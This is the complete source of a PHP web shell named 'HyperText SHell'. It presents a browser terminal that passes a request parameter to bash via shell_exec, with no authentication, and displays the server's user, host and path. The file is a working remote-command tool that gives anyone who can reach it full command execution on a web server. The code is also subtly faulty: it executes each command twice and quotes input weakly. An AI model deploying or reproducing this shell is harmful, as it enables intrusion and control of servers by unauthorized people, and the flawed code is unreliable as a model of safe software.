<?php
    session_start();

    if(!isset($_SESSION['cwd']))
        $_SESSION['cwd'] = getcwd();
    if(!isset($_SESSION['history']))
        $_SESSION['history'] = array();

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        
        chdir($_SESSION['cwd']);
        $output = htmlspecialchars(shell_exec('bash -c "'.addslashes($_GET["cmd"]).'; echo ""; pwd" 2>&1'));
        $_SESSION['cwd'] = end(explode("\n", trim($output)));
        
        if(!isset($_GET['silently']))
            array_unshift($_SESSION['history'], $_GET['cmd']);

        die(nl2br(htmlspecialchars(shell_exec('bash -c "'.addslashes($_GET["cmd"]).'" 2>&1'))));
    }
?>
<!DOCTYPE html>
    <head>
        <title>HTSH - HyperText SHell</title>
        <style>
            #htsh {
                background: #2c001e;
                min-height: 100%;
                position:absolute;
                overflow: auto;
                top:0px;
                right:0px;
                bottom:0px;
                left:0px;
                font-family: ubuntu mono, monospace;
                color: white;
                font-weight: bold;
            }
            #cursor {
                display: inline-block;
                width:3px;
                margin-left: -3px;
                animation: blink 0.5s step-start infinite;
            }
            @keyframes blink {
                50% {
                    opacity: 0;
                }
            }
        </style>
        <script language="javascript">

            var motd = ` /$$   /$$ /$$$$$$$$ /$$$$$$  /$$   /$$
| $$  | $$|__  $$__//$$__  $$| $$  | $$
| $$  | $$   | $$  | $$  \\__/| $$  | $$
| $$$$$$$$   | $$  |  $$$$$$ | $$$$$$$$
| $$__  $$   | $$   \\____  $$| $$__  $$
| $$  | $$   | $$   /$$  \\ $$| $$  | $$
| $$  | $$   | $$  |  $$$$$$/| $$  | $$
|__/  |__/   |__/   \\______/ |__/  |__/

Welcome to HyperText SHell.
`;

            var user = "<?php echo trim(shell_exec('whoami')) ?>";
            var host = "<?php echo trim(shell_exec('hostname')) ?>";
            var path = "<?php echo trim(shell_exec('pwd')) ?>"
            var url = "<?php echo($_SERVER['PHP_SELF']); ?>";
            var htsh;
            var buffer;
            var input;
            var cursor = '<span id="cursor">|</span>';
            var history_index = -1;
            const history = <?php echo json_encode($_SESSION['history']); ?>;
            let buffer_temp = "";
            //const cd = [];

            function printMOTD() {
                htsh.innerHTML += motd.replaceAll(' ', "&nbsp;").replaceAll('\n','<br />');
            }

            function show_prompt() {
                fetch(url+"?cmd=pwd&silently",{method: 'POST', credentials: 'include'})
                .then((response) => response.text())
                .then((result) => {
                    path = result.replaceAll("<br />","").trim();
                    let prompt = '<span style="color: #00f18b">'+user+'@'+host+'</span>:<span style="color: #0071f1">'+path+'</span>$ </span><span id="input"></span>';
                    htsh.innerHTML += '<span id="line">' + prompt + '</span>';
                    input = document.getElementById('input');
                    printBuffer(0);
                    buffer.disabled=false;
                    buffer.focus();
                });

            }
            function issueCommand() {
                let cmd = buffer.value;
                history.unshift(cmd);
                history_index = -1;
                buffer.value = "";
                document.getElementById('line').removeAttribute('id');
                document.getElementById('input').removeAttribute('id');
                let c = document.getElementById('cursor');
                c.parentElement.removeChild(c);
                htsh.innerHTML += "<br/>";
                buffer.disabled=true;

                console.log(user+"@"+host+":"+path+"$ "+cmd);
                fetch(url+"?cmd="+encodeURIComponent(cmd),{method: 'POST'})
                .then((response) => response.text())
                .then((result) => {
                    htsh.innerHTML += result;
                    console.log(result.replaceAll('<br />',''));
                    show_prompt();
                });
            }
            function printBuffer(sel) {
                input.innerHTML = "";
                for (var i = 0; i < buffer.value.length; i++) {
                    if (i==sel) {input.innerHTML += cursor;}
                    input.innerHTML += buffer.value.charAt(i);
                }
                if (sel>=buffer.value.length) {input.innerHTML += cursor;}
            }
            window.addEventListener("load", (event) => {
                htsh = document.getElementById('htsh');
                buffer = document.getElementById('buffer');
                buffer.value = "";
                printMOTD();
                buffer.addEventListener("input", (event) => {
                    printBuffer(event.target.selectionStart);
                });
                buffer.addEventListener("selectionchange", (event) => {
                    event.target.selectionStart = event.target.selectionEnd;
                    printBuffer(event.target.selectionStart);
                });
                window.addEventListener("keydown", (event) => {
                    console.log("test");
                    buffer.focus();
                })
                buffer.addEventListener("keyup", (event) => {
                    switch(event.keyCode) {
                        case 13:
                            issueCommand();
                            break;
                        case 38:
                            if (history_index < history.length -1)
                                history_index++;
                            if (history_index == -1)
                                break;
                            if (history_index == 0)
                                buffer_temp = buffer.value;
                            buffer.value = history[history_index];
                            break;
                        case 40:
                            if (history_index > -1)
                                history_index--;
                            if (history_index == -1)
                                buffer.value = buffer_temp;
                            else
                                buffer.value = history[history_index];
                            break;
                        default:
                            //console.log(event.keyCode);
                    }
                    printBuffer(event.target.selectionStart);
                });
                show_prompt();
            });
        </script>
    </head>

    <body>
        <input type="text" id="buffer">
        <div id="htsh">
        </div>
    <body>
</html>